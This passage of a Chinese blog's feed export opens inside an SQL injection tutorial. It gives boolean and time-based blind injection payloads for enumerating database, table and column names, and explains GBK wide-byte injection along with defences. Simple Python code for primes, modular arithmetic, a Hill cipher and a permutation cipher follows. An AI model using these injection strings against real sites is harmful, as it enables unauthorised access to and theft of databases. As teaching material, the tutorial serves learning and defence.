from 表名 limit 0,1),1,1))&gt;97 # 显示存在，然后采用二分法最终得到数据</li><li>也可以采用：</li><li>长度：and (select count(*) from 表名 where length(字段名)=长度)</li><li>数据：and (select count(*) from 表名 where substr(字段名,1,1)=’数据’</li><li>利用 ‘{0} {1}’ . format(i, j) 来处理数据</li></ul></li></ul><h5 id="Time-based-blind-SQL-injection"><a href="#Time-based-blind-SQL-injection" class="headerlink" title="Time-based blind SQL injection"></a>Time-based blind SQL injection</h5><ul><li><p>判断是否存在注入，注入是字符型还是数字型</p><ul><li>输入1’ and sleep(5) #，感觉到明显延迟；</li><li>输入1 and sleep(5) #，没有延迟，说明存在字符型的基于时间的盲注。</li></ul></li><li><p>猜解当前数据库名</p><ul><li>首先猜解数据名的长度：</li><li>1’ and if(length(database())=1,sleep(5),1) # 没有延迟</li><li>1’ and if(length(database())=2,sleep(5),1) # 没有延迟</li><li>1’ and if(length(database())=3,sleep(5),1) # 没有延迟</li><li>1’ and if(length(database())=4,sleep(5),1) # 明显延迟</li><li>说明数据库名长度为4个字符。</li><li>接着采用二分法猜解数据库名：</li><li>1’ and if(ascii(substr(database(),1,1))&gt;97,sleep(5),1)# 明显延迟</li><li>1’ and if(ascii(substr(database(),1,1))&lt;122,sleep(5),1)# 没有延迟</li><li>重复上述步骤，即可猜解出数据库名。</li></ul></li><li><p>猜解数据库中的表名</p><ul><li>首先猜解数据库中表的数量：</li><li>1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=1,sleep(5),1)# 没有延迟</li><li>1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=2,sleep(5),1)# 明显延迟</li><li>说明数据库中有两个表。</li><li>接着挨个猜解表名：</li><li>1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1,sleep(5),1) # 没有延迟</li><li>…</li><li>1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) # 明显延迟</li><li>说明第一个表名的长度为9个字符。</li><li>采用二分法即可猜解出表名。</li></ul></li><li><p>猜解表中的字段名</p><ul><li>首先猜解表中字段的数量：</li><li>1’ and if((select count(column_name) from information_schema.columns where table_name= ‘users’)=1,sleep(5),1)# 没有延迟</li><li>…</li><li>1’ and if((select count(column_name) from information_schema.columns where table_name= ‘users’)=8,sleep(5),1)# 明显延迟</li><li>说明users表中有8个字段。</li><li>接着挨个猜解字段名：</li><li>1’ and if(length(substr((select column_name from information_schema.columns where table_name= ‘users’ limit 0,1),1))=1,sleep(5),1) # 没有延迟</li><li>…</li><li>1’ and if(length(substr((select column_name from information_schema.columns where table_name= ‘users’ limit 0,1),1))=7,sleep(5),1) # 明显延迟</li><li>说明users表的第一个字段长度为7个字符。</li><li>采用二分法即可猜解出各个字段名。</li></ul></li><li><p>猜解数据</p><ul><li>同样采用二分法。</li></ul></li></ul><h3 id="SQL宽字节注入详解"><a href="#SQL宽字节注入详解" class="headerlink" title="SQL宽字节注入详解"></a>SQL宽字节注入详解</h3><p><strong><em>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</em></strong>导致<code>&#39;</code> 变成了<code>\&#39;</code> 。一般的绕过方式就是处理前面的<code>\</code> 。</p><p>宽字节注入是利用mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前面一个ascii码要大于128，才到汉字的范围）。如果我们输入%df，则%df和单引号前面的反斜杠（%5c）变成了一个汉字“運”，导致反斜杠后面的单引号逃逸出来。</p><p><strong><em>mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</em></strong></p><p>mysql_real_escape_string() 函数并不能抵御宽字节注入，因为没有指定PHP连接MySQL的字符集。我们需要在执行SQL语句之前条用一下<strong><em>mysql_set_charset() 函数</em></strong>，设置当前连接的字符集为GBK就可以避免这个问题了。</p><p><strong>防止宽字节注入</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.gbk编码造成的宽字符注入问题，解决方法是设置character_set_client=binary。</span><br><span class="line">2.矫正人们对于mysql_real_escape_string的误解，单独调用set name=gbk和mysql_real_escape_string是无法避免宽字符注入问题的。还得调用mysql_set_charset来设置一下字符集。</span><br><span class="line">3.谨慎使用iconv来转换字符串编码，很容易出现问题。只要我们把前端html/js/css所有编码设置成gbk，mysql/php编码设置成gbk，就不会出现乱码问题。不用画蛇添足地去调用iconv转换编码，造成不必要的麻烦。</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;作者：wlfsky
格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="SQL注入" scheme="http://wlfsky.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="http://wlfsky.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>素数-模幂-求逆运算</title>
    <link href="http://wlfsky.com/2017/12/23/%E7%B4%A0%E6%95%B0-%E6%A8%A1%E5%B9%82-%E6%B1%82%E9%80%86%E8%BF%90%E7%AE%97/"/>
    <id>http://wlfsky.com/2017/12/23/素数-模幂-求逆运算/</id>
    <published>2017-12-23T06:04:41.000Z</published>
    <updated>2017-12-23T06:18:26.361Z</updated>
    
    <content type="html"><![CDATA[<pre><code>作者：wlfsky格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采</code></pre><a id="more"></a><hr><h4 id="生成素数"><a href="#生成素数" class="headerlink" title="生成素数"></a>生成素数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成素数 </span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 定义一个生成奇数的函数，从3开始，生成的是一个无限序列 </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">odd_iter</span><span class="params">()</span>:</span>  </span><br><span class="line">    n = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:  </span><br><span class="line">        n += <span class="number">2</span></span><br><span class="line">        <span class="keyword">yield</span> n</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个筛选函数 </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filter_</span><span class="params">(n)</span>:</span>  </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">lambda</span> x : x % n &gt; <span class="number">0</span> </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 生成素数序列   </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">primes</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 返回素数2</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">2</span></span><br><span class="line">    <span class="comment"># 初始序列</span></span><br><span class="line">    it = odd_iter()</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="comment"># 返回序列的第一个数</span></span><br><span class="line">        n = next(it)</span><br><span class="line">        <span class="keyword">yield</span> n</span><br><span class="line">        <span class="comment"># 构造新序列</span></span><br><span class="line">        it = filter(filter_(n), it)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成素数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">suShu</span><span class="params">()</span>:</span></span><br><span class="line">    num = int(input(<span class="string">'请输入需要生成素数的位数：'</span>))</span><br><span class="line">    print(<span class="string">'正在生成素数，请稍等...'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> primes():</span><br><span class="line">        <span class="keyword">if</span> len(str(i)) == num:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>以上为生成素数的源码，参考自：<a href="https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/001431821084171d2e0f22e7cc24305ae03aa0214d0ef29000" target="_blank" rel="noopener">廖雪峰</a> 但是这个源码在生成7位以上的素数时运行速度会很慢，甚至有可能报出<em>堆栈溢出</em> 的错误，读者如果有更好的源码，希望可以分享出来哦！</p><h4 id="模幂运算"><a href="#模幂运算" class="headerlink" title="模幂运算"></a>模幂运算</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 模幂运算</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">moMi</span><span class="params">()</span>:</span></span><br><span class="line">    moShu = int(input(<span class="string">'请输入模数:'</span>))</span><br><span class="line">    beiMoShu = int(input (<span class="string">'请输入被模数:'</span>))</span><br><span class="line">    ciMiShu = int(input (<span class="string">'请输入次幂数:'</span>))</span><br><span class="line">    result = beiMoShu ** ciMiShu</span><br><span class="line">    result_output = result % moShu</span><br><span class="line">    print(<span class="string">'模幂的结果为：'</span>, result_output)</span><br></pre></td></tr></table></figure><p>以上为模幂运算的源码，水平有限，难免会有错误，恳请读者谅解并指正。</p><h4 id="求逆运算"><a href="#求逆运算" class="headerlink" title="求逆运算"></a>求逆运算</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 求逆运算</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">qiuNi</span><span class="params">()</span>:</span></span><br><span class="line">    e = int(input(<span class="string">'请输入被模数：'</span>))</span><br><span class="line">    mod = int(input(<span class="string">'请输入模数：'</span>))</span><br><span class="line">    num = e</span><br><span class="line">    d = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (num % mod) != <span class="number">1</span>:</span><br><span class="line">        d = d + <span class="number">1</span></span><br><span class="line">        num = num + e</span><br><span class="line">    print(<span class="string">'求得的逆为：'</span>, d)</span><br></pre></td></tr></table></figure><p>以上为求逆运算的源码，水平有限，难免会有错误，恳请读者谅解并指正。</p>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;作者：wlfsky
格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="密码学" scheme="http://wlfsky.com/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
      <category term="密码学" scheme="http://wlfsky.com/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>Hill密码</title>
    <link href="http://wlfsky.com/2017/12/23/Hill%E5%AF%86%E7%A0%81/"/>
    <id>http://wlfsky.com/2017/12/23/Hill密码/</id>
    <published>2017-12-23T05:38:10.000Z</published>
    <updated>2017-12-23T06:00:28.662Z</updated>
    
    <content type="html"><![CDATA[<pre><code>作者：wlfsky格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采</code></pre><a id="more"></a><hr><h4 id="Hill-密码"><a href="#Hill-密码" class="headerlink" title="Hill 密码"></a>Hill 密码</h4><p>​    多表代换密码。将明文消息按照步长m进行分组，对每一组的m个明文字母通过线性变换将其转换成m个相应的密文字母。</p><blockquote><p><strong>Hill密码体制</strong>      令m ≥ 2 是一个正整数，M=C=(Z<sub>26</sub>)<sup>m</sup>，K是定义在Z<sub>26</sub>上所有大小为m*m的可逆矩阵的集合。对任意的A∈K，定义</p><p>e<sub>A</sub>(x) = xA mod26</p><p>d<sub>A</sub>(x) = yA<sup>-1</sup> mod26</p></blockquote><p>Hill 密码能够较好地抵御基于字母出现频率的攻击方法。</p><p><strong>下面给出Hill密码的源码： </strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Hill密码</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 字符列表</span></span><br><span class="line">char_list = <span class="string">'abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Encryption</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="comment"># 定义一个存放加密数据的列表</span></span><br><span class="line">    jiami_list = []</span><br><span class="line">    <span class="comment"># 加密密钥矩阵</span></span><br><span class="line">    A = [[<span class="number">8</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">5</span>],</span><br><span class="line">         [<span class="number">6</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">10</span>],</span><br><span class="line">         [<span class="number">5</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">9</span>],</span><br><span class="line">         [<span class="number">10</span>,<span class="number">6</span>,<span class="number">11</span>,<span class="number">4</span>]]</span><br><span class="line">    <span class="comment"># 循环遍历用户输入的数据</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        <span class="comment"># 检查用户输入的数据是否在模字符串中</span></span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> char_list:</span><br><span class="line">            <span class="comment"># 寻找字符在模字符串中的具体位置</span></span><br><span class="line">            num = char_list.find(i)</span><br><span class="line">            jiami_list.append(num)</span><br><span class="line">    a_list = []</span><br><span class="line">    b_list = []</span><br><span class="line">    c_list = []</span><br><span class="line">    d_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        a = jiami_list[<span class="number">0</span>] * A[<span class="number">0</span>][i]</span><br><span class="line">        a_list.append(a)</span><br><span class="line">        b = jiami_list[<span class="number">1</span>] * A[<span class="number">1</span>][i]</span><br><span class="line">        b_list.append(b)</span><br><span class="line">        c = jiami_list[<span class="number">2</span>] * A[<span class="number">2</span>][i]</span><br><span class="line">        c_list.append(c)</span><br><span class="line">        d = jiami_list[<span class="number">3</span>] * A[<span class="number">3</span>][i]</span><br><span class="line">        d_list.append(d)</span><br><span class="line">    y1 = (a_list[<span class="number">0</span>] + b_list[<span class="number">0</span>] + c_list[<span class="number">0</span>] + d_list[<span class="number">0</span>]) % <span class="number">26</span></span><br><span class="line">    y2 = (a_list[<span class="number">1</span>] + b_list[<span class="number">1</span>] + c_list[<span class="number">1</span>] + d_list[<span class="number">1</span>]) % <span class="number">26</span></span><br><span class="line">    y3 = (a_list[<span class="number">2</span>] + b_list[<span class="number">2</span>] + c_list[<span class="number">2</span>] + d_list[<span class="number">2</span>]) % <span class="number">26</span></span><br><span class="line">    y4 = (a_list[<span class="number">3</span>] + b_list[<span class="number">3</span>] + c_list[<span class="number">3</span>] + d_list[<span class="number">3</span>]) % <span class="number">26</span></span><br><span class="line">    jiami_output = char_list[y1] + char_list[y2] + char_list[y3] + char_list[y4]</span><br><span class="line">    print(<span class="string">'加密后的数据为：'</span>, jiami_output)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Decrypt</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="comment"># 定义一个存放解密数据的列表</span></span><br><span class="line">    jiemi_list = []</span><br><span class="line">    <span class="comment"># 解密密钥矩阵 加密矩阵的逆矩阵</span></span><br><span class="line">    A_ = [[<span class="number">23</span>, <span class="number">20</span>, <span class="number">5</span>, <span class="number">1</span>],</span><br><span class="line">         [<span class="number">2</span>, <span class="number">11</span>, <span class="number">18</span>, <span class="number">1</span>],</span><br><span class="line">         [<span class="number">2</span>, <span class="number">20</span>, <span class="number">6</span>, <span class="number">25</span>],</span><br><span class="line">         [<span class="number">25</span>, <span class="number">2</span>, <span class="number">22</span>, <span class="number">25</span>]]</span><br><span class="line">    <span class="comment"># 循环遍历用户输入的数据</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        <span class="comment"># 检查用户输入的数据是否在模字符串中</span></span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> char_list:</span><br><span class="line">            <span class="comment"># 寻找字符在模字符串中的具体位置</span></span><br><span class="line">            num = char_list.find(i)</span><br><span class="line">            jiemi_list.append(num)</span><br><span class="line">    a_list = []</span><br><span class="line">    b_list = []</span><br><span class="line">    c_list = []</span><br><span class="line">    d_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        a = jiemi_list[<span class="number">0</span>] * A_[<span class="number">0</span>][i]</span><br><span class="line">        a_list.append(a)</span><br><span class="line">        b = jiemi_list[<span class="number">1</span>] * A_[<span class="number">1</span>][i]</span><br><span class="line">        b_list.append(b)</span><br><span class="line">        c = jiemi_list[<span class="number">2</span>] * A_[<span class="number">2</span>][i]</span><br><span class="line">        c_list.append(c)</span><br><span class="line">        d = jiemi_list[<span class="number">3</span>] * A_[<span class="number">3</span>][i]</span><br><span class="line">        d_list.append(d)</span><br><span class="line">    x1 = (a_list[<span class="number">0</span>] + b_list[<span class="number">0</span>] + c_list[<span class="number">0</span>] + d_list[<span class="number">0</span>]) % <span class="number">26</span></span><br><span class="line">    x2 = (a_list[<span class="number">1</span>] + b_list[<span class="number">1</span>] + c_list[<span class="number">1</span>] + d_list[<span class="number">1</span>]) % <span class="number">26</span></span><br><span class="line">    x3 = (a_list[<span class="number">2</span>] + b_list[<span class="number">2</span>] + c_list[<span class="number">2</span>] + d_list[<span class="number">2</span>]) % <span class="number">26</span></span><br><span class="line">    x4 = (a_list[<span class="number">3</span>] + b_list[<span class="number">3</span>] + c_list[<span class="number">3</span>] + d_list[<span class="number">3</span>]) % <span class="number">26</span></span><br><span class="line">    jiemi_output = char_list[x1] + char_list[x2] + char_list[x3] + char_list[x4]</span><br><span class="line">    print(<span class="string">'解密后的数据为：'</span>, jiemi_output)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主函数</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    print(<span class="string">'欢迎使用Hill密码程序！'</span>)</span><br><span class="line">    number = input(<span class="string">'请选择您需要的操作：0--加密  1--解密  2--退出\n'</span>)</span><br><span class="line">    <span class="keyword">if</span> number == <span class="string">'0'</span>:</span><br><span class="line">        data = input(<span class="string">'请输入您需要加密的数据：\n'</span>)</span><br><span class="line">        Encryption(data)</span><br><span class="line">    <span class="keyword">elif</span> number == <span class="string">'1'</span>:</span><br><span class="line">        data = input(<span class="string">'请输入您需要解密的数据：\n'</span>)</span><br><span class="line">        Decrypt(data)</span><br><span class="line">    <span class="keyword">elif</span> number == <span class="string">'2'</span>:</span><br><span class="line">        print(<span class="string">'退出成功，感谢您的使用！'</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'您的输入有误，请重新输入！'</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p>以上就是我自己编写的Hill密码的源码，水平有限，难免会有错误，恳请读者谅解并指正。</p>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;作者：wlfsky
格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="密码学" scheme="http://wlfsky.com/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
      <category term="密码学" scheme="http://wlfsky.com/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>置换密码</title>
    <link href="http://wlfsky.com/2017/12/23/%E7%BD%AE%E6%8D%A2%E5%AF%86%E7%A0%81/"/>
    <id>http://wlfsky.com/2017/12/23/置换密码/</id>
    <published>2017-12-23T05:38:01.000Z</published>
    <updated>2017-12-23T06:01:21.738Z</updated>
    
    <content type="html"><![CDATA[<pre><code>作者：wlfsky格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采</code></pre><a id="more"></a><hr><h4 id="置换密码"><a href="#置换密码" class="headerlink" title="置换密码"></a>置换密码</h4><p>​    通过重新排列消息中元素的位置而不改变元素本身的加密方式。</p><blockquote><p><strong>置换密码体制</strong>    令m ≥ 2 是一个正整数，M=C=(Z<sub>26</sub>)<sup>m</sup>，K是Z<sub>m</sub> = {1，2，···，m}上所有可能置换构成的集合。对任意的(x<sub>1</sub>，x<sub>2</sub>，···，x<sub>m</sub>)∈M，π∈K，y<sub>1</sub>，y<sub>2</sub>，···，y<sub>m</sub>)∈C，定义</p><p>e<sub>π</sub>(x<sub>1</sub>，x<sub>2</sub>，···，x<sub>m</sub>) = (x<sub>π(1)</sub>，x<sub>π(2)</sub>，···，x<sub>π(m)</sub>)</p><p>d<sub>π</sub>(y<sub>1</sub>，y<sub>2</sub>，···，y<sub>m</sub>) = ((y<sub>π(1)</sub>)<sup>-1</sup>，(y<sub>π(2)</sub>)<sup>-1</sup>，···，(y<sub>π(m)</sub>)<sup>-1</sup>)</p></blockquote><p>其中，π和π<sup>-1</sup>互为Z<sub>m</sub>上的逆置换，m称为分组长度。密钥空间为m!。</p><p><strong>下面给出置换密码的源码：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 置换密码</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Encryption</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="comment"># 定义一个存放加密数据的列表</span></span><br><span class="line">    jiami_list = []</span><br><span class="line">    <span class="comment"># 定义一个置换关系 4260531 分组长度为7</span></span><br><span class="line">    pi = <span class="string">'4260531'</span></span><br><span class="line">    <span class="comment"># 将用户输入的数据7个分为一组</span></span><br><span class="line">    data_list = [data[i:i+<span class="number">7</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(data), <span class="number">7</span>)]</span><br><span class="line">    <span class="keyword">for</span> data <span class="keyword">in</span> data_list:</span><br><span class="line">        <span class="comment"># 长度不足7的以 x 补全</span></span><br><span class="line">        <span class="keyword">while</span> len(data) &lt; <span class="number">7</span>:</span><br><span class="line">            data = data + <span class="string">'x'</span></span><br><span class="line">        k = <span class="number">0</span></span><br><span class="line">        <span class="comment"># 加密置换</span></span><br><span class="line">        <span class="keyword">while</span> k &lt; <span class="number">7</span>:</span><br><span class="line">            jiami = data[int(pi[k])]</span><br><span class="line">            k = k + <span class="number">1</span></span><br><span class="line">            jiami_list.append(jiami)</span><br><span class="line">    jiami_output = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> jiami_list:</span><br><span class="line">        jiami_output = jiami_output + i</span><br><span class="line">    print(<span class="string">'加密后的数据为：'</span>, jiami_output)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Decrypt</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="comment"># 定义一个存放解密数据的列表</span></span><br><span class="line">    jiemi_list = []</span><br><span class="line">    <span class="comment"># 置换关系 </span></span><br><span class="line">    pi = <span class="string">'3615042'</span></span><br><span class="line">    data_list = [data[i:i+<span class="number">7</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(data), <span class="number">7</span>)]</span><br><span class="line">    <span class="keyword">for</span> data <span class="keyword">in</span> data_list:</span><br><span class="line">        <span class="keyword">while</span> len(data) &lt; <span class="number">7</span>:</span><br><span class="line">            data = data + <span class="string">'x'</span></span><br><span class="line">        k = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> k &lt; <span class="number">7</span>:</span><br><span class="line">            jiemi = data[int(pi[k])]</span><br><span class="line">            k = k + <span class="number">1</span></span><br><span class="line">            jiemi_list.append(jiemi)</span><br><span class="line">    jiemi_output = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> jiemi_list:</span><br><span class="line">        jiemi_output = jiemi_output + i</span><br><span class="line">    print(<span class="string">'解密后的数据为：'</span>, jiemi_output)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主函数</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    print(<span class="string">'欢迎使用置换密码程序！'</span>)</span><br><span class="line">    number = input(<span class="string">'请选择您需要的操作：0--加密  1--解密  2--退出\n'</span>)</span><br><span class="line">    <span class="keyword">if</span> number == <span class="string">'0'</span>:</span><br><span class="line">        data = input(<span class="string">'请输入您需要加密的数据：\n'</span>)</span><br><span class="line">        Encryption(data)</span><br><span class="line">    <span class="keyword">elif</span> number == <span class="string">'1'</span>:</span><br><span class="line">        data = input(<span class="string">'请输入您需要解密的数据：\n'</span>)</span><br><span class="line">        Decrypt(data)</span><br><span class="line">    <span class="keyword">elif</span> number == <span class="string">'2'</span>:</span><br><span class="line">        print(<span class="string">'退出成功，感谢您的使用！'</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'您的输入有误，请重新输入！'</span>)</span><br><span class="line">        <span 